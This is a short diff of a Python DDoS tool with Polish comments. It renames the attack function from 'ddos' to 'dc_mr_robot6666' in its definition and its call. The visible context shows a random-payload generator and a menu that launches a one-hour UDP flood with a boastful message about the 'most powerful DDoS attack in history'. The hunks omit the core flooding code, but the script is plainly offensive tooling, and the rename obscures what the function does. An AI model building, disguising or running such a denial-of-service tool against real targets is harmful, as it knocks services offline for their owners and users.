@@ -4,7 +4,7 @@ import time
 import random
 import string
 
-def ddos(target_ips, target_ports, power, rate, protocol, duration):
+def dc_mr_robot6666(target_ips, target_ports, power, rate, protocol, duration):
     # Funkcja do generowania losowych danych
     def generate_random_data(size):
         return ''.join(random.choices(string.ascii_letters + string.digits, k=size))
@@ -73,7 +73,7 @@ if __name__ == "__main__":
             protocol = "UDP"
             duration = 3600
             print("Rozpoczynam najpotężniejszy atak DDoS w historii! To będzie niezapomniane! 😈💥🔥")
-            ddos(target_ips, target_ports, power, rate, protocol, duration)
+            dc_mr_robot6666(target_ips, target_ports, power, rate, protocol, duration)
             print("Atak DDoS zakończony.")
         elif choice == "2":
             print("Do widzenia!")
